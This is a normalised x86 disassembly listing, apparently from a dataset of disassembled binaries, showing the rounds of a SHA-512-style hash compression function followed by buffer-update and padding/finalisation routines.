mov eax [ esp + 0x58 ]
add esi edx
mov edx [ esp + 0xec ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x5c ]
adc edi ebx
mov ebx [ esp + 0x28 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x54 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x2c ]
mov [ esp + 0x28 ] ebx
mov ebx [ esp + 0x50 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x2c ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x50 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
or ebx eax
mov eax [ esp + 0x20 ]
or ebp edx
xor edi ebx
xor esi ebp
mov ecx [ esp + 0x50 ]
mov ebp [ esp + 0x54 ]
mov edx eax
xor edx ecx
mov ecx [ esp + 0x24 ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x38 ]
and edx ebp
mov ebp [ esp + 0x3c ]
and ebx ebp
mov ebp [ esp + 0x50 ]
and eax ebp
mov ebp [ esp + 0x54 ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
mov eax [ esp + 0x78 ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
lea ecx [ eax + 0x30 ]
mov [ esp + 0x58 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x5c ] esi
call sub_100400d0
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x28 ]
mov [ esp + 0xf4 ] eax
mov [ esp + 0xf8 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x2c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x2c ]
or ebp eax
mov eax [ esp + 0x28 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x40 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x44 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x30 ]
and ebp eax
mov eax [ esp + 0x34 ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
xor ebx eax
mov eax [ r--data ]
mov ecx [ esp + 0x48 ]
add esi edx
mov edx [ esp + 0xf8 ]
adc edi ebx
mov ebx [ esp + 0xf4 ]
add esi eax
mov eax [ esp + 0x4c ]
adc edi ebp
mov ebp [ esp + 0x38 ]
add esi ebx
mov ebx [ esp + 0x3c ]
adc edi edx
add esi ecx
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x54 ]
adc edi eax
add ebp esi
adc ebx edi
mov eax ecx
mov [ esp + 0x3c ] ebx
mov ebx [ esp + 0x58 ]
xor eax ebx
mov [ esp + 0x38 ] ebp
mov ebp [ esp + 0x5c ]
mov [ esp + 0x9c ] eax
mov eax edx
mov [ esp + 0x18 ] esi
xor eax ebp
mov esi ebx
mov [ esp + 0xa0 ] eax
mov eax ecx
and eax ebx
mov [ esp + 0x1c ] edi
mov [ esp + 0x94 ] eax
mov eax edx
and eax ebp
mov ecx 0x1c
mov [ esp + 0x98 ] eax
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x58 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x9c ]
or ebp edx
mov edx [ esp + 0x20 ]
or ebx eax
mov eax [ esp + 0x24 ]
and ecx edx
mov edx [ esp + 0xa0 ]
xor edi ebx
xor esi ebp
mov ebp [ esp + 0x94 ]
and edx eax
mov ebx [ esp + 0x98 ]
xor ecx ebp
mov eax [ esp + 0x78 ]
xor edx ebx
mov ebx [ esp + 0x18 ]
add edi ecx
adc esi edx
add edi ebx
mov [ esp + 0x48 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
lea ecx [ eax + 0x38 ]
mov [ esp + 0x4c ] esi
call sub_100400d0
mov ebp [ esp + 0x3c ]
mov ebx [ esp + 0x38 ]
mov [ esp + 0xfc ] eax
mov [ esp + 0x100 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x3c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x3c ]
or ebp eax
mov eax [ esp + 0x38 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x30 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x34 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x28 ]
and ebp eax
mov eax [ esp + 0x2c ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0x100 ]
xor ebx eax
mov eax [ esp + 0x40 ]
add esi edx
mov edx [ esp + 0xfc ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
adc edi ebx
add esi edx
adc edi ecx
add esi eax
mov [ esp + 0x18 ] esi
mov ebp [ esp + 0x44 ]
mov ebx [ esp + 0x20 ]
adc edi ebp
mov ebp [ esp + 0x4c ]
add ebx esi
mov esi [ esp + 0x24 ]
mov [ esp + 0x20 ] ebx
mov ebx [ esp + 0x48 ]
adc esi edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x24 ] esi
mov esi ebx
mov ecx 0x1c
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x48 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0xa0 ]
or ebx eax
mov eax [ esp + 0x9c ]
or ebp edx
mov edx [ esp + 0x4c ]
xor edi ebx
mov ebx [ esp + 0x48 ]
xor esi ebp
mov ebp [ esp + 0x94 ]
and eax ebx
mov ebx [ esp + 0x98 ]
and ecx edx
xor eax ebp
xor ecx ebx
mov ebx [ esp + 0x18 ]
add edi eax
adc esi ecx
mov ecx [ esp + 0x78 ]
add edi ebx
mov [ esp + 0x40 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
add ecx 0x40
mov [ esp + 0x44 ] esi
call sub_100400d0
mov ebp [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
mov [ esp + 0x104 ] eax
mov [ esp + 0x108 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or esi eax
or edi edx
mov edx ebx
xor eax eax
mov ecx 0x12
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x24 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x24 ]
or ebp eax
mov eax [ esp + 0x20 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x28 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x2c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x38 ]
and ebp eax
mov eax [ esp + 0x3c ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0x108 ]
xor ebx eax
mov eax [ esp + 0x30 ]
add esi edx
mov edx [ esp + 0x104 ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x34 ]
adc edi ebx
mov ebx [ esp + 0x50 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x44 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x54 ]
mov [ esp + 0x50 ] ebx
mov ebx [ esp + 0x40 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x54 ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
mov ecx 0x1e
shr edx 0x2
xor eax eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x40 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x58 ]
or ebx eax
mov eax [ esp + 0x40 ]
or ebp edx
mov edx eax
xor edi ebx
xor edx ecx
mov ecx [ esp + 0x44 ]
xor esi ebp
mov ebp [ esp + 0x5c ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x48 ]
and edx ebp
mov ebp [ esp + 0x4c ]
and ebx ebp
mov ebp [ esp + 0x58 ]
and eax ebp
mov ebp [ esp + 0x5c ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
mov eax [ esp + 0x78 ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
lea ecx [ eax + 0x48 ]
mov [ esp + 0x30 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x34 ] esi
call sub_100400d0
mov ebp [ esp + 0x54 ]
mov ebx [ esp + 0x50 ]
mov [ esp + 0x10c ] eax
mov [ esp + 0x110 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x54 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x54 ]
or ebp eax
mov eax [ esp + 0x50 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x38 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x3c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x20 ]
and ebp eax
mov eax [ esp + 0x24 ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0x110 ]
xor ebx eax
mov eax [ esp + 0x28 ]
add esi edx
mov edx [ esp + 0x10c ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x2c ]
adc edi ebx
mov ebx [ esp + 0x58 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x34 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x5c ]
mov [ esp + 0x58 ] ebx
mov ebx [ esp + 0x30 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x5c ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x30 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
or ebx eax
mov eax [ esp + 0x40 ]
or ebp edx
xor edi ebx
xor esi ebp
mov edx eax
mov ecx [ esp + 0x30 ]
mov ebp [ esp + 0x34 ]
xor edx ecx
mov ecx [ esp + 0x44 ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x48 ]
and edx ebp
mov ebp [ esp + 0x4c ]
and ebx ebp
mov ebp [ esp + 0x30 ]
and eax ebp
mov ebp [ esp + 0x34 ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
mov eax [ esp + 0x78 ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
lea ecx [ eax + 0x50 ]
mov [ esp + 0x28 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x2c ] esi
call sub_100400d0
mov ebp [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
mov [ esp + 0x114 ] eax
mov [ esp + 0x118 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x5c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x5c ]
or ebp eax
mov eax [ esp + 0x58 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x20 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x24 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x50 ]
and ebp eax
mov eax [ esp + 0x54 ]
and eax ecx
xor edx ebp
xor ebx eax
mov ebp [ r--data ]
mov ecx [ esp + 0x118 ]
mov eax [ esp + 0x38 ]
add esi edx
mov edx [ esp + 0x114 ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x3c ]
adc edi ebx
mov ebx [ esp + 0x48 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x2c ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x4c ]
mov [ esp + 0x48 ] ebx
mov ebx [ esp + 0x28 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x4c ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x28 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x28 ]
or ebx eax
mov eax [ esp + 0x30 ]
or ebp edx
mov edx eax
xor edi ebx
xor edx ecx
mov ecx [ esp + 0x34 ]
xor esi ebp
mov ebp [ esp + 0x2c ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x40 ]
and edx ebp
mov ebp [ esp + 0x44 ]
and ebx ebp
mov ebp [ esp + 0x28 ]
and eax ebp
mov ebp [ esp + 0x2c ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
mov eax [ esp + 0x78 ]
mov [ esp + 0x38 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
lea ecx [ eax + 0x58 ]
mov [ esp + 0x3c ] esi
call sub_100400d0
mov ebp [ esp + 0x4c ]
mov ebx [ esp + 0x48 ]
mov [ esp + 0x11c ] eax
mov [ esp + 0x120 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x4c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x4c ]
or ebp eax
mov eax [ esp + 0x48 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x50 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x54 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x58 ]
and eax ebp
mov ebp [ esp + 0x5c ]
and ecx ebp
mov ebp [ r--data ]
xor edx eax
xor ebx ecx
mov ecx [ esp + 0x120 ]
mov eax [ esp + 0x20 ]
add esi edx
mov edx [ esp + 0x11c ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x24 ]
adc edi ebx
mov ebx [ esp + 0x40 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
add ebx esi
mov [ esp + 0x18 ] esi
mov esi [ esp + 0x44 ]
mov [ esp + 0x1c ] edi
mov [ esp + 0x40 ] ebx
mov ebx [ esp + 0x38 ]
mov ebp [ esp + 0x3c ]
adc esi edi
mov ecx 0x1c
mov [ esp + 0x44 ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x38 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x3c ]
or ebx eax
mov eax [ esp + 0x38 ]
or ebp edx
mov edx [ esp + 0x28 ]
xor edi ebx
xor esi ebp
mov ebp [ esp + 0x2c ]
mov ebx edx
xor ebp ecx
and ebp [ esp + 0x34 ]
xor ebx eax
and ebx [ esp + 0x30 ]
and edx eax
mov eax [ esp + 0x2c ]
and eax ecx
xor ebx edx
xor ebp eax
mov ecx [ esp + 0x78 ]
add edi ebx
mov ebx [ esp + 0x18 ]
adc esi ebp
add edi ebx
mov [ esp + 0x20 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
add ecx 0x60
mov [ esp + 0x24 ] esi
call sub_100400d0
mov ebp [ esp + 0x44 ]
mov ebx [ esp + 0x40 ]
mov [ esp + 0x124 ] eax
mov [ esp + 0x128 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
or esi eax
mov edx ebx
xor eax eax
shl edx 0xe
mov ecx 0x12
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x44 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x44 ]
or ebp eax
mov eax [ esp + 0x40 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x58 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x5c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x48 ]
and ebp eax
mov eax [ esp + 0x4c ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0x128 ]
xor ebx eax
mov eax [ esp + 0x50 ]
add esi edx
mov edx [ esp + 0x124 ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x54 ]
adc edi ebx
mov ebx [ esp + 0x30 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x24 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x34 ]
mov [ esp + 0x30 ] ebx
mov ebx [ esp + 0x20 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x34 ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
xor edi ecx
or eax edx
mov edx ebp
xor esi eax
mov eax [ esp + 0x20 ]
mov ebx edx
mov ecx 0x19
shr ebx 0x7
xor ebp ebp
call sub_1006b020
mov ecx [ esp + 0x20 ]
or ebx eax
mov eax [ esp + 0x38 ]
or ebp edx
mov edx eax
xor edi ebx
xor edx ecx
mov ecx [ esp + 0x3c ]
xor esi ebp
mov ebp [ esp + 0x24 ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x28 ]
and edx ebp
mov ebp [ esp + 0x2c ]
and ebx ebp
mov ebp [ esp + 0x20 ]
and eax ebp
mov ebp [ esp + 0x24 ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
mov eax [ esp + 0x78 ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
lea ecx [ eax + 0x68 ]
mov [ esp + 0x50 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x54 ] esi
call sub_100400d0
mov ebp [ esp + 0x34 ]
mov ebx [ esp + 0x30 ]
mov [ esp + 0x12c ] eax
mov [ esp + 0x130 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x34 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
or ebp eax
or ebx edx
xor esi ebp
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x34 ]
mov ebp [ esp + 0x48 ]
mov edx eax
xor edi ebx
mov ebx ecx
not edx
and edx ebp
mov ebp [ esp + 0x4c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x40 ]
and ebp eax
mov eax [ esp + 0x44 ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0x130 ]
xor ebx eax
mov eax [ esp + 0x58 ]
add esi edx
mov edx [ esp + 0x12c ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x5c ]
adc edi ebx
mov ebx [ esp + 0x28 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x54 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x2c ]
mov [ esp + 0x28 ] ebx
mov ebx [ esp + 0x50 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x2c ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x50 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x50 ]
or ebx eax
mov eax [ esp + 0x20 ]
or ebp edx
mov edx eax
xor edi ebx
xor esi ebp
xor edx ecx
mov ecx [ esp + 0x24 ]
mov ebp [ esp + 0x54 ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x38 ]
and edx ebp
mov ebp [ esp + 0x3c ]
and ebx ebp
mov ebp [ esp + 0x50 ]
and eax ebp
mov ebp [ esp + 0x54 ]
and ecx ebp
xor edx eax
mov eax [ esp + 0x1c ]
xor ebx ecx
mov ecx [ esp + 0x18 ]
add edi edx
adc esi ebx
add edi ecx
adc esi eax
mov eax 0x11
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] esi
mov [ esp + 0x8c ] eax
mov [ esp + 0x90 ] r--data
pop edi
pop esi
pop ebp
pop ebx
sub_100400e0
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
push edi
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebx [ esp + 0x14 ]
mov ecx [ ebx + 0x10 ]
lea eax [ ecx + ebp * 8 ]
cmp eax ecx
jae r-xdata
mov edx [ ebx + 0x14 ]
mov ecx ebp
shr ecx 0x1d
mov [ ebx + 0x10 ] eax
mov eax [ ebx + 0x58 ]
add edx ecx
test eax eax
mov [ ebx + 0x14 ] edx
je r-xdata
inc [ ebx + 0x14 ]
mov edi ebp
shr edi 0x6
je r-xdata
cmp ebp 0x40
lea edx [ ebx + 0x18 ]
jae r-xdata
test ebp ebp
je r-xdata
push edi
push esi
push ebx
call sub_10040350
shl edi 0x6
add esp 0xc
add esi edi
sub ebp edi
mov ecx 0x40
lea edi [ edx + eax ]
sub ecx eax
push 0x1
mov [ esp + 0x20 ] ecx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push edx
and ecx 0x3
push ebx
[ edi ] [ esi ]
call sub_10040350
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
add esp 0xc
sub ebp eax
lea esi [ eax + ecx ]
mov ecx 0x10
xor eax eax
lea edi [ ebx + 0x18 ]
mov [ ebx + 0x58 ] 0x0
[ edi ]
lea ecx [ eax + ebp ]
cmp ecx 0x40
jae r-xdata
mov ecx ebp
lea edi [ ebx + 0x18 ]
mov edx ecx
mov [ ebx + 0x58 ] ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebp
lea edi [ edx + eax ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x58 ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0x58 ] eax
pop ebp
mov eax 0x1
pop ebx
retn
sub_100401e0
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x58 ]
lea esi [ ebx + 0x18 ]
mov [ edi + esi ] 0x80
inc edi
cmp edi 0x38
jbe r-xdata
mov ecx 0x38
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
add esi 0x38
shr ecx 0x2
[ edi ]
mov ecx edx
push 0x1
and ecx 0x3
inc esi
[ edi ]
mov al [ ebx + 0x10 ]
mov [ esi - 0x1 ] al
mov ecx [ ebx + 0x10 ]
shr ecx 0x8
mov [ esi ] cl
mov edx [ ebx + 0x10 ]
inc esi
shr edx 0x10
mov [ esi ] dl
mov eax [ ebx + 0x10 ]
inc esi
shr eax 0x18
mov [ esi ] al
mov cl [ ebx + 0x14 ]
inc esi
mov [ esi ] cl
mov edx [ ebx + 0x14 ]
inc esi
shr edx 0x8
mov [ esi ] dl
mov eax [ ebx + 0x14 ]
inc esi
shr eax 0x10
mov [ esi ] al
mov ecx [ ebx + 0x14 ]
inc esi
shr ecx 0x18
mov [ esi ] cl
